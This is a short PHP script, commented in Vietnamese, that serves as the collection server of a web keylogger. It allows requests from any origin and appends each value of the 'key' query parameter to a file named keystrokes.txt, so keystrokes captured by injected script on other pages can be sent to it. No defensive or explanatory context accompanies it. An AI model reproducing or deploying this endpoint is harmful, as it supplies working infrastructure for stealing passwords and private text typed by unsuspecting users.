<?php
header("Access-Control-Allow-Origin: *");
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Ghi dữ liệu phím bấm vào file
if (isset($_GET['key'])) {
    $key = $_GET['key'];
    file_put_contents("keystrokes.txt", $key . "\n", FILE_APPEND);
    exit;
}
?>
